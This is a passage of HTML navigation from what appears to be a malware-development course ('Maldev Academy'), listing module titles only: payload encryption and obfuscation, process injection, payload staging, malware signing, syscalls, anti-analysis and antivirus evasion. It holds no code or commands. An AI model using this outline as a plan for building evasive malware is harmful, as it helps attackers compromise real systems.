                            <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./11.html">
                                <div for="module-11" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 11 - Windows Processes
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./12.html">
                                <div for="module-12" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 12 - Undocumented Structures
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./13.html">
                                <div for="module-13" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 13 - Payload Placement - .data &amp; .rdata Sections
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./14.html">
                                <div for="module-14" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 14 - Payload Placement - .text Section
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./15.html">
                                <div for="module-15" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 15 - Payload Placement - .rsrc Section
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./16.html">
                                <div for="module-16" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 16 - Introduction To Payload Encryption
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./17.html">
                                <div for="module-17" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 17 - Payload Encryption - XOR
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./18.html">
                                <div for="module-18" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 18 - Payload Encryption - RC4
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./19.html">
                                <div for="module-19" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 19 - Payload Encryption - AES Encryption
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./20.html">
                                <div for="module-20" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 20 - Evading Microsoft Defender Static Analysis
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./21.html">
                                <div for="module-21" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 21 - Payload Obfuscation - IPv4/IPv6Fuscation
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./22.html">
                                <div for="module-22" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 22 - Payload Obfuscation - MACFuscation
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./23.html">
                                <div for="module-23" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 23 - Payload Obfuscation - UUIDFuscation
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./24.html">
                                <div for="module-24" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 24 - Maldev Academy Tool - HellShell
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./25.html">
                                <div for="module-25" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 25 - Maldev Academy Tool - MiniShell
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./26.html">
                                <div for="module-26" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 26 - Local Payload Execution - DLL
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./27.html">
                                <div for="module-27" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 27 - Local Payload Execution - Shellcode
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./28.html">
                                <div for="module-28" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 28 - Process Injection - DLL Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./29.html">
                                <div for="module-29" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 29 - Process Injection - Shellcode Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./30.html">
                                <div for="module-30" class="ml-2 text-sm font-medium 
                                            bg-blue-700 font-bold rounded-sm">
                                    Module 30 - Payload Staging - Web Server
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./31.html">
                                <div for="module-31" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 31 - Payload Staging - Windows Registry
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./32.html">
                                <div for="module-32" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 32 - Malware Binary Signing
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./33.html">
                                <div for="module-33" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 33 - Process Enumeration - EnumProcesses
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./34.html">
                                <div for="module-34" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 34 - Process Enumeration - NtQuerySystemInformation
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./35.html">
                                <div for="module-35" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 35 - Thread Hijacking - Local Thread Creation
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./36.html">
                                <div for="module-36" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 36 - Thread Hijacking - Remote Thread Creation
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./37.html">
                                <div for="module-37" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 37 - Thread Hijacking - Local Thread Enumeration
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./38.html">
                                <div for="module-38" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 38 - Thread Hijacking - Remote Thread Enumeration
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./39.html">
                                <div for="module-39" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 39 - APC Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./40.html">
                                <div for="module-40" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 40 - Early Bird APC Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./41.html">
                                <div for="module-41" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 41 - Callback Code Execution
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./42.html">
                                <div for="module-42" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 42 - Local Mapping Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./43.html">
                                <div for="module-43" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 43 - Remote Mapping Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./44.html">
                                <div for="module-44" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 44 - Local Function Stomping Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./45.html">
                                <div for="module-45" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 45 - Remote Function Stomping Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./46.html">
                                <div for="module-46" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 46 - Payload Execution Control
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./47.html">
                                <div for="module-47" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 47 - Spoofing PPID
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./48.html">
                                <div for="module-48" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 48 - Process Argument Spoofing (1)
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./49.html">
                                <div for="module-49" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 49 - Process Argument Spoofing (2)
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./50.html">
                                <div for="module-50" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 50 - Parsing PE Headers
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./51.html">
                                <div for="module-51" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 51 - String Hashing
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./52.html">
                                <div for="module-52" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 52 - IAT Hiding &amp; Obfuscation - Introduction
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./53.html">
                                <div for="module-53" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 53 - IAT Hiding &amp; Obfuscation - Custom GetProcAddress
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./54.html">
                                <div for="module-54" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 54 - IAT Hiding &amp; Obfuscation - Custom GetModuleHandle
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./55.html">
                                <div for="module-55" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 55 - IAT Hiding &amp; Obfuscation - API Hashing
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./56.html">
                                <div for="module-56" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 56 - IAT Hiding &amp; Obfuscation - Custom Pseudo Handles
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./57.html">
                                <div for="module-57" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 57 - IAT Hiding &amp; Obfuscation - Compile Time API Hashing
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./58.html">
                                <div for="module-58" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 58 - API Hooking - Introduction
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./59.html">
                                <div for="module-59" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 59 - API Hooking - Detours Library
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./60.html">
                                <div for="module-60" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 60 - API Hooking - Minhook Library
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./61.html">
                                <div for="module-61" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 61 - API Hooking - Custom Code
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./62.html">
                                <div for="module-62" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 62 - API Hooking - Using Windows APIs
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./63.html">
                                <div for="module-63" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 63 - Syscalls - Introduction
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./64.html">
                                <div for="module-64" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 64 - Syscalls - Userland Hooking
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./65.html">
                                <div for="module-65" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 65 - Syscalls - SysWhispers
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./66.html">
                                <div for="module-66" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 66 - Syscalls - Hell's Gate
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./67.html">
                                <div for="module-67" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 67 - Syscalls - Reimplementing Classic Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./68.html">
                                <div for="module-68" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 68 - Syscalls - Reimplementing Mapping Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./69.html">
                                <div for="module-69" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 69 - Syscalls - Reimplementing APC Injection
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./70.html">
                                <div for="module-70" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 70 - Anti-Analysis - Introduction
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./71.html">
                                <div for="module-71" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 71 - Anti-Debugging - Multiple Techniques
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./72.html">
                                <div for="module-72" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 72 - Anti-Debugging - Self-Deletion
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./73.html">
                                <div for="module-73" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 73 - Anti-Virtual Environments - Multiple Techniques
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./74.html">
                                <div for="module-74" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 74 - Anti-Virtual Environments - Multiple Delay Execution Techniques
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./75.html">
                                <div for="module-75" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 75 - Anti-Virtual Environments - API Hammering
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./76.html">
                                <div for="module-76" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 76 - Binary Entropy Reduction
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./77.html">
                                <div for="module-77" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 77 - Brute Force Decryption
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./78.html">
                                <div for="module-78" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 78 - MalDev Academy Tool - KeyGuard
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./79.html">
                                <div for="module-79" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 79 - CRT Library Removal &amp; Malware Compiling
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./80.html">
                                <div for="module-80" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 80 - IAT Camouflage
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
                            <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                            <a data-target="_self" href="./81.html">
                                <div for="module-81" class="ml-2 text-sm font-medium 
                                            text-gray-900 dark:text-gray-300">
                                    Module 81 - Bypassing AVs
                                </div>
                            </a>
                        </div>
                                                                                <div class="flex items-center mb-2 font-sans">
